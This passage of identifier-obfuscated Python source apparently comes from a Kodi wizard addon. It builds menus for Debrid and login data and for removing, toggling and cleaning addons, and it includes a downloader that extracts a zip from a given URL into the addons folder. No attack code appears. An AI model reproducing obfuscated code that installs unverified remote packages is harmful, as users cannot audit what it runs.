		O0O00000O0O00OOOO =createMenu ('save','Debrid',OO0OOO000OO0O0O0O )#line:3015
		O0OO0O00OO0OO0OOO .append ((THEME2 %'%s Settings'%O0O000OOO00OOOO00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OO0OOO000OO0O0O0O )))#line:3016
		addFile ('[+]-> %s'%O0O000OOO00OOOO00 ,'',icon =O0OOOOO0OOOOO00OO ,fanart =OOO0O0000000O00O0 ,themeit =THEME3 )#line:3018
		if not os .path .exists (OOOO00OOOO0O00OO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOOOO0OOOOO00OO ,fanart =OOO0O0000000O00O0 ,menu =O0OO0O00OO0OO0OOO )#line:3019
		elif not O0O00000000OOOOOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OO0OOO000OO0O0O0O ,icon =O0OOOOO0OOOOO00OO ,fanart =OOO0O0000000O00O0 ,menu =O0OO0O00OO0OO0OOO )#line:3020
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00000000OOOOOO ,'authdebrid',OO0OOO000OO0O0O0O ,icon =O0OOOOO0OOOOO00OO ,fanart =OOO0O0000000O00O0 ,menu =O0OO0O00OO0OO0OOO )#line:3021
		if OOO000OOOOO00O0O0 =="":#line:3022
			if os .path .exists (O00000OO0O000000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OO0OOO000OO0O0O0O ,icon =O0OOOOO0OOOOO00OO ,fanart =OOO0O0000000O00O0 ,menu =O0O00000O0O00OOOO )#line:3023
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OO0OOO000OO0O0O0O ,icon =O0OOOOO0OOOOO00OO ,fanart =OOO0O0000000O00O0 ,menu =O0O00000O0O00OOOO )#line:3024
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO000OOOOO00O0O0 ,'',icon =O0OOOOO0OOOOO00OO ,fanart =OOO0O0000000O00O0 ,menu =O0O00000O0O00OOOO )#line:3025
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3027
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3028
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3029
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3030
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3031
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3032
	setView ('files','viewType')#line:3033
def loginMenu ():#line:3035
	OOO0O00OO0OO0OO00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3036
	O0000O0OO00000000 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3037
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3038
	addFile ('Save Login Data: %s'%OOO0O00OO0OO0OO00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3039
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0000O0OO00000000 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3040
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3041
	for OOO0O00OO0OO0OO00 in loginit .ORDER :#line:3043
		O00OO00O0OO000O00 =LOGINID [OOO0O00OO0OO0OO00 ]['name']#line:3044
		OOOO0OOO0OOOO00OO =LOGINID [OOO0O00OO0OO0OO00 ]['path']#line:3045
		OOOO00OOOOO0OO0OO =LOGINID [OOO0O00OO0OO0OO00 ]['saved']#line:3046
		OO00O0O000000O0O0 =LOGINID [OOO0O00OO0OO0OO00 ]['file']#line:3047
		OO0O0O00O00O0OO00 =wiz .getS (OOOO00OOOOO0OO0OO )#line:3048
		OOOOOOOOO0OOO0O00 =loginit .loginUser (OOO0O00OO0OO0OO00 )#line:3049
		O00O0OOOO0O00OO0O =LOGINID [OOO0O00OO0OO0OO00 ]['icon']if os .path .exists (OOOO0OOO0OOOO00OO )else ICONLOGIN #line:3050
		O0O0O000O0OO00O0O =LOGINID [OOO0O00OO0OO0OO00 ]['fanart']if os .path .exists (OOOO0OOO0OOOO00OO )else FANART #line:3051
		OO0O0O0OO000O0O0O =createMenu ('saveaddon','Login',OOO0O00OO0OO0OO00 )#line:3052
		OO00O0OOO0O000O0O =createMenu ('save','Login',OOO0O00OO0OO0OO00 )#line:3053
		OO0O0O0OO000O0O0O .append ((THEME2 %'%s Settings'%O00OO00O0OO000O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOO0O00OO0OO0OO00 )))#line:3054
		addFile ('[+]-> %s'%O00OO00O0OO000O00 ,'',icon =O00O0OOOO0O00OO0O ,fanart =O0O0O000O0OO00O0O ,themeit =THEME3 )#line:3056
		if not os .path .exists (OOOO0OOO0OOOO00OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O0OOOO0O00OO0O ,fanart =O0O0O000O0OO00O0O ,menu =OO0O0O0OO000O0O0O )#line:3057
		elif not OOOOOOOOO0OOO0O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOO0O00OO0OO0OO00 ,icon =O00O0OOOO0O00OO0O ,fanart =O0O0O000O0OO00O0O ,menu =OO0O0O0OO000O0O0O )#line:3058
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOOOOOO0OOO0O00 ,'authlogin',OOO0O00OO0OO0OO00 ,icon =O00O0OOOO0O00OO0O ,fanart =O0O0O000O0OO00O0O ,menu =OO0O0O0OO000O0O0O )#line:3059
		if OO0O0O00O00O0OO00 =="":#line:3060
			if os .path .exists (OO00O0O000000O0O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOO0O00OO0OO0OO00 ,icon =O00O0OOOO0O00OO0O ,fanart =O0O0O000O0OO00O0O ,menu =OO00O0OOO0O000O0O )#line:3061
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOO0O00OO0OO0OO00 ,icon =O00O0OOOO0O00OO0O ,fanart =O0O0O000O0OO00O0O ,menu =OO00O0OOO0O000O0O )#line:3062
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O0O00O00O0OO00 ,'',icon =O00O0OOOO0O00OO0O ,fanart =O0O0O000O0OO00O0O ,menu =OO00O0OOO0O000O0O )#line:3063
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3065
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3066
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3067
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3068
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3069
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3070
	setView ('files','viewType')#line:3071
def fixUpdate ():#line:3073
	if KODIV <17 :#line:3074
		O0O0O000O000OOOOO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3075
		try :#line:3076
			os .remove (O0O0O000O000OOOOO )#line:3077
		except Exception as OOO0OOOOOO0OO0000 :#line:3078
			wiz .log ("Unable to remove %s, Purging DB"%O0O0O000O000OOOOO )#line:3079
			wiz .purgeDb (O0O0O000O000OOOOO )#line:3080
	else :#line:3081
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3082
def removeAddonMenu ():#line:3084
	O0OOOOO000000OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3085
	O0O0O00O000OO0OO0 =[];O0OOO000OO0O0O000 =[]#line:3086
	for OOOOOO00OOO0O0O00 in sorted (O0OOOOO000000OOOO ,key =lambda O000OO0O00OO00O0O :O000OO0O00OO00O0O ):#line:3087
		OO0O0000OO0OO0OO0 =os .path .split (OOOOOO00OOO0O0O00 [:-1 ])[1 ]#line:3088
		if OO0O0000OO0OO0OO0 in EXCLUDES :continue #line:3089
		elif OO0O0000OO0OO0OO0 in DEFAULTPLUGINS :continue #line:3090
		elif OO0O0000OO0OO0OO0 =='packages':continue #line:3091
		OO000O00OOOO00O0O =os .path .join (OOOOOO00OOO0O0O00 ,'addon.xml')#line:3092
		if os .path .exists (OO000O00OOOO00O0O ):#line:3093
			O0O0O0OO0OO0OO00O =open (OO000O00OOOO00O0O )#line:3094
			OO00OOOOO0O000OOO =O0O0O0OO0OO0OO00O .read ()#line:3095
			OO0OO0O0O0000O0OO =wiz .parseDOM (OO00OOOOO0O000OOO ,'addon',ret ='id')#line:3096
			OOOO000OOOO00OOO0 =OO0O0000OO0OO0OO0 if len (OO0OO0O0O0000O0OO )==0 else OO0OO0O0O0000O0OO [0 ]#line:3098
			try :#line:3099
				O00O0OOOOO000OO0O =xbmcaddon .Addon (id =OOOO000OOOO00OOO0 )#line:3100
				O0O0O00O000OO0OO0 .append (O00O0OOOOO000OO0O .getAddonInfo ('name'))#line:3101
				O0OOO000OO0O0O000 .append (OOOO000OOOO00OOO0 )#line:3102
			except :#line:3103
				pass #line:3104
	if len (O0O0O00O000OO0OO0 )==0 :#line:3105
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3106
		return #line:3107
	if KODIV >16 :#line:3108
		O000O000O0OOOOO0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0O0O00O000OO0OO0 )#line:3109
	else :#line:3110
		O000O000O0OOOOO0O =[];O0OOO00OO00000OOO =0 #line:3111
		O000OO000O00OOOO0 =["-- Click here to Continue --"]+O0O0O00O000OO0OO0 #line:3112
		while not O0OOO00OO00000OOO ==-1 :#line:3113
			O0OOO00OO00000OOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O000OO000O00OOOO0 )#line:3114
			if O0OOO00OO00000OOO ==-1 :break #line:3115
			elif O0OOO00OO00000OOO ==0 :break #line:3116
			else :#line:3117
				O0OOOO0OO00000OOO =(O0OOO00OO00000OOO -1 )#line:3118
				if O0OOOO0OO00000OOO in O000O000O0OOOOO0O :#line:3119
					O000O000O0OOOOO0O .remove (O0OOOO0OO00000OOO )#line:3120
					O000OO000O00OOOO0 [O0OOO00OO00000OOO ]=O0O0O00O000OO0OO0 [O0OOOO0OO00000OOO ]#line:3121
				else :#line:3122
					O000O000O0OOOOO0O .append (O0OOOO0OO00000OOO )#line:3123
					O000OO000O00OOOO0 [O0OOO00OO00000OOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0O0O00O000OO0OO0 [O0OOOO0OO00000OOO ])#line:3124
	if O000O000O0OOOOO0O ==None :return #line:3125
	if len (O000O000O0OOOOO0O )>0 :#line:3126
		wiz .addonUpdates ('set')#line:3127
		for OO0O0OOOO0OOOOOOO in O000O000O0OOOOO0O :#line:3128
			removeAddon (O0OOO000OO0O0O000 [OO0O0OOOO0OOOOOOO ],O0O0O00O000OO0OO0 [OO0O0OOOO0OOOOOOO ],True )#line:3129
		xbmc .sleep (1000 )#line:3131
		if INSTALLMETHOD ==1 :O00OOO000OO0O00OO =1 #line:3133
		elif INSTALLMETHOD ==2 :O00OOO000OO0O00OO =0 #line:3134
		else :O00OOO000OO0O00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3135
		if O00OOO000OO0O00OO ==1 :wiz .reloadFix ('remove addon')#line:3136
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3137
def removeAddonDataMenu ():#line:3139
	if os .path .exists (ADDOND ):#line:3140
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3141
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3142
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3143
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3144
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3145
		O0OOOOOO0OOOOO0OO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3146
		for OOOO0O00O0O00OOO0 in sorted (O0OOOOOO0OOOOO0OO ,key =lambda O00OO0O0O0000O00O :O00OO0O0O0000O00O ):#line:3147
			O0O00000O0O00O00O =OOOO0O00O0O00OOO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3148
			OOOO00OO00O0O0OO0 =os .path .join (OOOO0O00O0O00OOO0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3149
			OOO000OO0OO000OO0 =os .path .join (OOOO0O00O0O00OOO0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3150
			O0OOOOO00000000O0 =O0O00000O0O00O00O #line:3151
			O00OOOO0O00OOO0O0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3152
			for OO0O0O00OOO00000O in O00OOOO0O00OOO0O0 :#line:3153
				O0OOOOO00000000O0 =O0OOOOO00000000O0 .replace (OO0O0O00OOO00000O ,O00OOOO0O00OOO0O0 [OO0O0O00OOO00000O ])#line:3154
			if O0O00000O0O00O00O in EXCLUDES :O0OOOOO00000000O0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0OOOOO00000000O0 #line:3155
			else :O0OOOOO00000000O0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0OOOOO00000000O0 #line:3156
			addFile (' %s'%O0OOOOO00000000O0 ,'removedata',O0O00000O0O00O00O ,icon =OOOO00OO00O0O0OO0 ,fanart =OOO000OO0OO000OO0 ,themeit =THEME2 )#line:3157
	else :#line:3158
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3159
	setView ('files','viewType')#line:3160
def enableAddons ():#line:3162
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3163
	O00O000O0000O000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3164
	O0OOOOO0OO00OO00O =0 #line:3165
	for OO0OO0OOOO000OOO0 in sorted (O00O000O0000O000O ,key =lambda OO00O0OOOOOOOO00O :OO00O0OOOOOOOO00O ):#line:3166
		OOO0O0000O00OO00O =os .path .split (OO0OO0OOOO000OOO0 [:-1 ])[1 ]#line:3167
		if OOO0O0000O00OO00O in EXCLUDES :continue #line:3168
		if OOO0O0000O00OO00O in DEFAULTPLUGINS :continue #line:3169
		OOOOOOOOO0O0O00OO =os .path .join (OO0OO0OOOO000OOO0 ,'addon.xml')#line:3170
		if os .path .exists (OOOOOOOOO0O0O00OO ):#line:3171
			O0OOOOO0OO00OO00O +=1 #line:3172
			O00O000O0000O000O =OO0OO0OOOO000OOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3173
			OOO0000O000OO0O00 =open (OOOOOOOOO0O0O00OO )#line:3174
			OOOO000O0OO00OOO0 =OOO0000O000OO0O00 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3175
			O0O00000O0O0000OO =wiz .parseDOM (OOOO000O0OO00OOO0 ,'addon',ret ='id')#line:3176
			OOO00O00OOOOO0O0O =wiz .parseDOM (OOOO000O0OO00OOO0 ,'addon',ret ='name')#line:3177
			try :#line:3178
				O0OOO0OO0OOO0O00O =O0O00000O0O0000OO [0 ]#line:3179
				OO0OO0O00O00000OO =OOO00O00OOOOO0O0O [0 ]#line:3180
			except :#line:3181
				continue #line:3182
			try :#line:3183
				O0000O0OOOOO000OO =xbmcaddon .Addon (id =O0OOO0OO0OOO0O00O )#line:3184
				O0OO0OO0000OO0000 ="[COLOR green][Enabled][/COLOR]"#line:3185
				O00000000OOOO00OO ="false"#line:3186
			except :#line:3187
				O0OO0OO0000OO0000 ="[COLOR red][Disabled][/COLOR]"#line:3188
				O00000000OOOO00OO ="true"#line:3189
				pass #line:3190
			O0O0O0OOO0OOOOO0O =os .path .join (OO0OO0OOOO000OOO0 ,'icon.png')if os .path .exists (os .path .join (OO0OO0OOOO000OOO0 ,'icon.png'))else ICON #line:3191
			OOO0O00OO0000O000 =os .path .join (OO0OO0OOOO000OOO0 ,'fanart.jpg')if os .path .exists (os .path .join (OO0OO0OOOO000OOO0 ,'fanart.jpg'))else FANART #line:3192
			addFile ("%s %s"%(O0OO0OO0000OO0000 ,OO0OO0O00O00000OO ),'toggleaddon',O00O000O0000O000O ,O00000000OOOO00OO ,icon =O0O0O0OOO0OOOOO0O ,fanart =OOO0O00OO0000O000 )#line:3193
			OOO0000O000OO0O00 .close ()#line:3194
	if O0OOOOO0OO00OO00O ==0 :#line:3195
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3196
	setView ('files','viewType')#line:3197
def changeFeq ():#line:3199
	O000OO00OO0OOOO0O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3200
	OOO0O0OOOO0O0O00O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O000OO00OO0OOOO0O )#line:3201
	if not OOO0O0OOOO0O0O00O ==-1 :#line:3202
		wiz .setS ('autocleanfeq',str (OOO0O0OOOO0O0O00O ))#line:3203
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O000OO00OO0OOOO0O [OOO0O0OOOO0O0O00O ]))#line:3204
def developer ():#line:3206
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3207
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3208
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3209
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3210
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3211
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3212
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3213
	setView ('files','viewType')#line:3215
def download (O0OOOO00OOO0OO0OO ,OO0OO000OO0OOOOOO ):#line:3220
  OO00O00O000O000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3221
  O0OO0O0000OO00O00 =xbmcgui .DialogProgress ()#line:3222
  O0OO0O0000OO00O00 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3223
  OO0OOOOOOO0000OO0 =os .path .join (OO00O00O000O000OO ,'isr.zip')#line:3224
  O0O0O0O0OO0O00OO0 =urllib2 .Request (O0OOOO00OOO0OO0OO )#line:3225
  O0O0O0OO00OOOOO0O =urllib2 .urlopen (O0O0O0O0OO0O00OO0 )#line:3226
  OO000O0OO0OO00OO0 =xbmcgui .DialogProgress ()#line:3228
  OO000O0OO0OO00OO0 .create ("Downloading","Downloading "+name )#line:3229
  OO000O0OO0OO00OO0 .update (0 )#line:3230
  OO0O00OO0OO0OO0O0 =OO0OO000OO0OOOOOO #line:3231
  O0O0000OO0O0O000O =open (OO0OOOOOOO0000OO0 ,'wb')#line:3232
  try :#line:3234
    O0O00OO0000O0OOOO =O0O0O0OO00OOOOO0O .info ().getheader ('Content-Length').strip ()#line:3235
    OO000O000000O00O0 =True #line:3236
  except AttributeError :#line:3237
        OO000O000000O00O0 =False #line:3238
  if OO000O000000O00O0 :#line:3240
        O0O00OO0000O0OOOO =int (O0O00OO0000O0OOOO )#line:3241
  O0000000O000O0O0O =0 #line:3243
  O0000OOO0OOO000OO =time .time ()#line:3244
  while True :#line:3245
        O00OOOOOO0OO00O0O =O0O0O0OO00OOOOO0O .read (8192 )#line:3246
        if not O00OOOOOO0OO00O0O :#line:3247
            sys .stdout .write ('\n')#line:3248
            break #line:3249
        O0000000O000O0O0O +=len (O00OOOOOO0OO00O0O )#line:3251
        O0O0000OO0O0O000O .write (O00OOOOOO0OO00O0O )#line:3252
        if not OO000O000000O00O0 :#line:3254
            O0O00OO0000O0OOOO =O0000000O000O0O0O #line:3255
        if OO000O0OO0OO00OO0 .iscanceled ():#line:3256
           OO000O0OO0OO00OO0 .close ()#line:3257
           try :#line:3258
            os .remove (OO0OOOOOOO0000OO0 )#line:3259
           except :#line:3260
            pass #line:3261
           break #line:3262
        OO0OO0000OO0OOO0O =float (O0000000O000O0O0O )/O0O00OO0000O0OOOO #line:3263
        OO0OO0000OO0OOO0O =round (OO0OO0000OO0OOO0O *100 ,2 )#line:3264
        O000OO000OO0O00O0 =O0000000O000O0O0O /(1024 *1024 )#line:3265
        O0O00O000O0OOO0O0 =O0O00OO0000O0OOOO /(1024 *1024 )#line:3266
        OO0000OOOOO0OOOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000OO000OO0O00O0 ,'teal',O0O00O000O0OOO0O0 )#line:3267
        if (time .time ()-O0000OOO0OOO000OO )>0 :#line:3268
          O00O0O0O0OOOO0OOO =O0000000O000O0O0O /(time .time ()-O0000OOO0OOO000OO )#line:3269
          O00O0O0O0OOOO0OOO =O00O0O0O0OOOO0OOO /1024 #line:3270
        else :#line:3271
         O00O0O0O0OOOO0OOO =0 #line:3272
        O0O0O0O0000O0O0OO ='KB'#line:3273
        if O00O0O0O0OOOO0OOO >=1024 :#line:3274
           O00O0O0O0OOOO0OOO =O00O0O0O0OOOO0OOO /1024 #line:3275
           O0O0O0O0000O0O0OO ='MB'#line:3276
        if O00O0O0O0OOOO0OOO >0 and not OO0OO0000OO0OOO0O ==100 :#line:3277
            O00O0000OOOOO0OOO =(O0O00OO0000O0OOOO -O0000000O000O0O0O )/O00O0O0O0OOOO0OOO #line:3278
        else :#line:3279
            O00O0000OOOOO0OOO =0 #line:3280
        O0OOO00O0OOO0O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0O0O0OOOO0OOO ,O0O0O0O0000O0O0OO )#line:3281
        OO000O0OO0OO00OO0 .update (int (OO0OO0000OO0OOO0O ),"Downloading "+name ,OO0000OOOOO0OOOO0 ,O0OOO00O0OOO0O0OO )#line:3283
  OOO00000OO00O0OOO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3286
  O0O0000OO0O0O000O .close ()#line:3288
  extract (OO0OOOOOOO0000OO0 ,OOO00000OO00O0OOO ,OO000O0OO0OO00OO0 )#line:3290
  if os .path .exists (OOO00000OO00O0OOO +'/scakemyer-script.quasar.burst'):#line:3291
    if os .path .exists (OOO00000OO00O0OOO +'/script.quasar.burst'):#line:3292
     shutil .rmtree (OOO00000OO00O0OOO +'/script.quasar.burst',ignore_errors =False )#line:3293
    os .rename (OOO00000OO00O0OOO +'/scakemyer-script.quasar.burst',OOO00000OO00O0OOO +'/script.quasar.burst')#line:3294
  if os .path .exists (OOO00000OO00O0OOO +'/plugin.video.kmediatorrent-master'):#line:3296
    if os .path .exists (OOO00000OO00O0OOO +'/plugin.video.kmediatorrent'):#line:3297
     shutil .rmtree (OOO00000OO00O0OOO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3298
    os .rename (OOO00000OO00O0OOO +'/plugin.video.kmediatorrent-master',OOO00000OO00O0OOO +'/plugin.video.kmediatorrent')#line:3299
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3300
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3301
  try :#line:3302
    os .remove (OO0OOOOOOO0000OO0 )#line:3303
  except :#line:3304
    pass #line:3305
  OO000O0OO0OO00OO0 .close ()#line:3306
def dis_or_enable_addon (OO0O0OO0000OO0OOO ,O0O0OO00O000OOOOO ,enable ="true"):#line:3307
    import json #line:3308
    O00OO0OO0OO0OO000 ='"%s"'%OO0O0OO0000OO0OOO #line:3309
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OO0000OO0OOO )and enable =="true":#line:3310
        logging .warning ('already Enabled')#line:3311
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O0OO0000OO0OOO )#line:3312
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OO0000OO0OOO )and enable =="false":#line:3313
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O0OO0000OO0OOO )#line:3314
    else :#line:3315
        OO00OO00OOO0OOOO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OO0OO0OO0OO000 ,enable )#line:3316
        O0000OOO00OOO0000 =xbmc .executeJSONRPC (OO00OO00OOO0OOOO0 )#line:3317
        O00000OOO000O0OOO =json .loads (O0000OOO00OOO0000 )#line:3318
        if enable =="true":#line:3319
            xbmc .log ("### Enabled %s, response = %s"%(OO0O0OO0000OO0OOO ,O00000OOO000O0OOO ))#line:3320
        else :#line:3321
            xbmc .log ("### Disabled %s, response = %s"%(OO0O0OO0000OO0OOO ,O00000OOO000O0OOO ))#line:3322
    if O0O0OO00O000OOOOO =='auto':#line:3323
     return True #line:3324
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3325
def chunk_report (O0OO0OOO0O0O00O00 ,OO0O00O00O00OO0O0 ,OOO0OOOO0O00O0OOO ):#line:3326
   O0OO00000OOO0OO00 =float (O0OO0OOO0O0O00O00 )/OOO0OOOO0O00O0OOO #line:3327
   O0OO00000OOO0OO00 =round (O0OO00000OOO0OO00 *100 ,2 )#line:3328
   if O0OO0OOO0O0O00O00 >=OOO0OOOO0O00O0OOO :#line:3330
      sys .stdout .write ('\n')#line:3331
def chunk_read (O0O0OOOO0O0O0OO00 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3333
   import time #line:3334
   O0OO0OOOO0O000OO0 =int (filesize )*1000000 #line:3335
   OO000OO0O0O0O00O0 =0 #line:3337
   OO0OOO00OO00O0O00 =time .time ()#line:3338
   OOO000O0OOOO0000O =0 #line:3339
   logging .warning ('Downloading')#line:3341
   with open (destination ,"wb")as O00O00OOOOO00000O :#line:3342
    while 1 :#line:3343
      O0OOOO0O0O0O00O0O =time .time ()-OO0OOO00OO00O0O00 #line:3344
      OOOO0OOOOO0O00000 =int (OOO000O0OOOO0000O *chunk_size )#line:3345
      O00O0O00OOO000000 =O0O0OOOO0O0O0OO00 .read (chunk_size )#line:3346
      O00O00OOOOO00000O .write (O00O0O00OOO000000 )#line:3347
      O00O00OOOOO00000O .flush ()#line:3348
      OO000OO0O0O0O00O0 +=len (O00O0O00OOO000000 )#line:3349
      O0000OO0OO00O00O0 =float (OO000OO0O0O0O00O0 )/O0OO0OOOO0O000OO0 #line:3350
      O0000OO0OO00O00O0 =round (O0000OO0OO00O00O0 *100 ,2 )#line:3351
      if int (O0OOOO0O0O0O00O0O )>0 :#line:3352
        O0O00OOO0O000OO00 =int (OOOO0OOOOO0O00000 /(1024 *O0OOOO0O0O0O00O0O ))#line:3353
      else :#line:3354
         O0O00OOO0O000OO00 =0 #line:3355
      if O0O00OOO0O000OO00 >1024 and not O0000OO0OO00O00O0 ==100 :#line:3356
          O0O000OO00OO0O000 =int (((O0OO0OOOO0O000OO0 -OOOO0OOOOO0O00000 )/1024 )/(O0O00OOO0O000OO00 ))#line:3357
      else :#line:3358
          O0O000OO00OO0O000 =0 #line:3359
      if O0O000OO00OO0O000 <0 :#line:3360
        O0O000OO00OO0O000 =0 #line:3361
      dp .update (int (O0000OO0OO00O00O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0000OO0OO00O00O0 ,OOOO0OOOOO0O00000 /(1024 *1024 ),O0OO0OOOO0O000OO0 /(1000 *1000 ),O0O00OOO0O000OO00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O000OO00OO0O000 ,60 ))#line:3362
      if dp .iscanceled ():#line:3363
         dp .close ()#line:3364
         break #line:3365
      if not O00O0O00OOO000000 :#line:3366
         break #line:3367
      if report_hook :#line:3369
         report_hook (OO000OO0O0O0O00O0 ,chunk_size ,O0OO0OOOO0O000OO0 )#line:3370
      OOO000O0OOOO0000O +=1 #line:3371
   logging .warning ('END Downloading')#line:3372
   return OO000OO0O0O0O00O0 #line:3373
